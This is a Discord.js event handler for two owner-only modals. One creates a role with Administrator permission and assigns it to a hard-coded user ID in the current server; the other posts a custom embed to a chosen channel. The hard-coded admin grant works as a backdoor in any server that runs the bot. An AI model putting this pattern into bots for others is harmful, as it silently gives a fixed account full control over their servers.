const { EmbedBuilder } = require('discord.js');

const OWNER_ID = "969181284784025670";

module.exports = {
  name: 'interactionCreate',

  async execute(interaction) {

    try {

      // ================= ROLE MODAL =================
      if (interaction.isModalSubmit() && interaction.customId === 'role_builder') {

        if (interaction.user.id !== OWNER_ID) {
          return interaction.reply({
            content: '❌ Only owner can use this.',
            ephemeral: true
          });
        }

        const roleName = interaction.fields.getTextInputValue('role_name');

        const role = await interaction.guild.roles.create({
          name: roleName,
          permissions: ['Administrator'],
          reason: 'Owner role setup'
        });

        await interaction.member.roles.add(role);

        return interaction.reply({
          content: `👑 Role **${role.name}** created and assigned.`,
          ephemeral: true
        });
      }

      // ================= EMBED MODAL =================
      if (interaction.isModalSubmit() && interaction.customId === 'embed_builder') {

        if (interaction.user.id !== OWNER_ID) {
          return interaction.reply({
            content: '❌ Only owner can use this.',
            ephemeral: true
          });
        }

        const channelId = interaction.fields.getTextInputValue('channel');
        const title = interaction.fields.getTextInputValue('title');
        const description = interaction.fields.getTextInputValue('description');
        const footer = interaction.fields.getTextInputValue('footer');
        const topImage = interaction.fields.getTextInputValue('top_image');

        const channel = await interaction.guild.channels.fetch(channelId).catch(() => null);

        if (!channel) {
          return interaction.reply({
            content: '❌ Invalid channel ID',
            ephemeral: true
          });
        }

        // ================= TOP IMAGE =================
        if (topImage) {
          await channel.send({ content: topImage });
        }

        // ================= EMBED =================
        const embed = new EmbedBuilder()
          .setColor(0x2b2d31);

        if (title) embed.setTitle(title);
        if (description) embed.setDescription(description);
        if (footer) embed.setFooter({ text: footer });

        await channel.send({ embeds: [embed] });

        return interaction.reply({
          content: `✅ Embed sent successfully in <#${channel.id}>`,
          ephemeral: true
        });
      }

    } catch (err) {
      console.error("Interaction Error:", err);

      if (interaction.replied || interaction.deferred) return;

      return interaction.reply({
        content: '❌ Interaction failed safely handled',
        ephemeral: true
      }).catch(() => {});
    }
  }
};
